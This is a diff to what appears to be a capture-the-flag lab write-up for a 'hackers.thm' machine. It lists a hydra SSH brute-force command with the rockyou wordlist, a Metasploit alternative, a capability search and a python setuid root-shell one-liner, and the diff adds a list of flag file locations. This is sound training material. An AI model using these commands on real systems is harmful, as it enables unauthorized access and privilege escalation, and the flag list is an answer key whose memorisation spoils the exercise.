@@ -15,3 +15,14 @@
 1. `hydra ssh://hackers.thm -l rcampbell -P /usr/share/wordlists/rockyou.txt -t 64` or `msfconsole` `use auxiliary/scanner/ssh/ssh_login`
 2. `getcap -r / 2>/dev/null` *optional*
 3. `python -c 'import os,pty; os.setuid(0);pty.spawn("/bin/bash")'`
+
+## Flags
+1. /root/.flag
+2. /home/gcrawford/business.txt
+3. /home/tryhackme/.flag
+4. /home/rcampbell/.flag
+5. /home/production/.flag
+6. /home/production/webserver/resources/main.css
+7. /var/ftp/.flag
+8. /etc/vsftpd.conf
+9. /etc/ssh/sshd_config
